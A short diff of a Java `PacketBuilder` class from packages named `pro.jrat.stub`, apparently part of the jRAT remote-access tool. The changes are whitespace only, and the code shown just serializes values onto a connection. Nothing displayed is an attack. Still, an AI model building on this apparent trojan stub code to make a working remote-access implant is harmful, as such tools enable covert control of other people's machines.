@@ -7,7 +7,6 @@ import pro.jrat.common.exceptions.PacketAlreadySentException;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.OutgoingHeader;
 
-
 public class PacketBuilder {
 
 	private final short header;
@@ -50,7 +49,7 @@ public class PacketBuilder {
 
 			for (int i = 0; list != null && i < list.size(); i++) {
 				Object obj = list.get(i);
-				
+
 				if (obj instanceof Integer) {
 					Connection.writeInt((Integer) obj);
 				} else if (obj instanceof Long) {
@@ -62,7 +61,7 @@ public class PacketBuilder {
 				} else {
 					Connection.writeLine(obj.toString());
 				}
-				
+
 			}
 
 			sent = true;
